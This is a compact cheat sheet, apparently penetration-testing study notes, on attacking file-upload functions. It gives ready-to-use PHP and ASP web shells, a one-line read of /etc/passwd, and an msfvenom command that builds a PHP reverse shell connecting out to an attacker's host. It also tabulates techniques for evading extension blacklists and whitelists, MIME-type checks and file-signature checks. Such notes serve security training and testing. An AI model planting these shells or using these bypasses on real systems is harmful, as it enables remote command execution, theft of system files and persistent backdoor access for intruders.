## Web Shells

|Description|Payload|
|---|---|
|PHP File Read|`<?php echo file_get_contents('/etc/passwd'); ?>`|
|PHP Command Execution|`<?php system('hostname'); ?>`|
|PHP Web Shell|`<?php system($_REQUEST['cmd']); ?>`|
|ASP Web Shell|`<% eval request('cmd') %>`|
|PHP Reverse Shell|`msfvenom -p php/reverse_php LHOST=<lhost> LPORT=<lport> -f raw > reverse.php`|

---
### Blacklist Bypass

|Bypass|Example|
|---|---|
|Uncommon extension|`shell.phtml`|
|Case manipulation|`shell.pHp`|

### Whitelist Bypass

|Bypass|Example|
|---|---|
|Double extension|`shell.jpg.php`|
|Reverse double extension|`shell.php.jpg`|
|Character injection|`shell.php%20`, `shell.php%0a`, `shell.php%00`, `shell.php/`, `shell.php.\`|

### Content-Type Bypass

|Bypass|Method|
|---|---|
|Spoof MIME type|Change `Content-Type` header to a whitelisted type (e.g. `image/jpeg`)|
|Spoof file signature|Prepend magic bytes matching a whitelisted format (e.g. `GIF8` for GIF)|

---

## Limited Uploads

|Attack|File Types|
|---|---|
|XSS|HTML, JS, SVG, GIF|
|XXE / SSRF|XML, SVG, PDF, PPT, DOC|
|DoS|ZIP, JPG, PNG|
